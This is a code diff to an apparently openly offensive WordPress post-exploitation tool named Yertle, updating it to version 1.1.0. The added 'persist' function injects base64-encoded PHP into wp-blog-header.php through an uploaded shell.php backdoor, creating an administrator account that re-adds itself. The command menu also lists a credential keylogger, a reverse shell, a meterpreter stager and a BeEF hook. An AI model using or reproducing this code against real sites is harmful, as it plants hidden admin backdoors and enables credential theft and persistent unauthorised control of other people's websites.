@@ -43,7 +43,7 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
         if verbose is True:
             print "Found CSRF Token: " + nonce
     except:
-        print "Didn't find a CSRF token, check the URL."
+        print "Didn't find a CSRF token, check the URL and/or credentials."
         sys.exit(2)
 
     files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),
@@ -88,6 +88,7 @@ def commandloop(host,uploaddir):
                 keylogger                 Patches WordPress core to log plaintext credentials
                 keylog                    Displays keylog file
                 meterpreter               Executes a PHP meterpreter stager to connect to metasploit
+                persist                   Creates an admin account that will re-add itself
                 quit                      Terminate the session
                 shell                     Sends a TCP reverse shell to a netcat listener
                 stealth                   Hides Yertle from the plugins page
@@ -107,6 +108,8 @@ def commandloop(host,uploaddir):
             meterpreter(host, uploaddir)
         elif cmd == "beef":
             beefhook(host, uploaddir)
+        elif cmd == "persist":
+            persist(host, uploaddir)
         elif cmd == "dbcreds":
             creds = datacreds(host, uploaddir)
             print "Hostname: " + creds[0]
@@ -342,6 +345,31 @@ def beefhook(host,uploaddir):
         sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
         print "BeEF hook added!  Check BeEF for any hooked clients. Do not run this multiple times."
 
+def persist(host,uploaddir):
+    username = raw_input('Username: ')
+    email = raw_input('Email: ')
+    password = raw_input('Password: ')
+    evilcode = '''
+    $new_user = '%s';
+    $new_user_email = '%s';
+    $new_user_password = '%s';
+
+if(!username_exists($new_user_email)) {
+  $user_id = wp_create_user($new_user, $new_user_password, $new_user_email);
+
+  wp_update_user(array('ID' => $user_id, 'nickname' => $new_user, 'user_email' => $new_user_email));
+}
+  $user = new WP_User($user_id);
+  $user->set_role('administrator');
+''' % (username, email, password)
+    payload = evilcode.encode('base64')
+    if warning():
+        params = [
+            ('cmd',('php -r \'echo base64_decode("' + payload + '");\' >> ../../../wp-blog-header.php').encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        print "Added persistent user \"%s\" with the password \"%s\"." % (username, password)
+
+
 
 def printbanner():
     banner = """\
@@ -352,15 +380,12 @@ def printbanner():
   (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
    (_..)--(.._)'--'         ~n00py~
       Post-exploitation Module for Wordpress
-                     v.1.0.0
+                     v.1.1.0
     """
     print banner
 
 
 def argcheck(interactive,reverse,target):
-    if interactive and reverse:
-        print "-i and -r are mutually exclusive"
-        sys.exit()
 
     if interactive is False and reverse is False:
         print "You must choose a type of shell: --reverse or --interactive"
@@ -373,7 +398,7 @@ def argcheck(interactive,reverse,target):
 
 def main():
     parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
-    parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
+    parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true', default=True)
     parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
     parser.add_argument('-t','--target',help='URL of target', required=True)
     parser.add_argument('-u','--username',help='Admin username', required=False)
@@ -386,7 +411,8 @@ def main():
     args = parser.parse_args()
     printbanner()
     argcheck(args.interactive,args.reverse,args.target)
-    if args.interactive:
+
+    if not args.reverse:
         if args.existing is None:
             if args.username is None or args.password is None:
                 print "Username and Password are required"
@@ -394,9 +420,9 @@ def main():
             uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose, args.agent)
         else:
             uploaddir = args.existing
-        commandloop(args.target,uploaddir)
+        commandloop(args.target, uploaddir)
 
-    if args.reverse:
+    if args.reverse and args.interactive:
         if args.ip is None or args.port is None:
             print "For a reverse shell, a listening IP and Port are required"
             sys.exit()
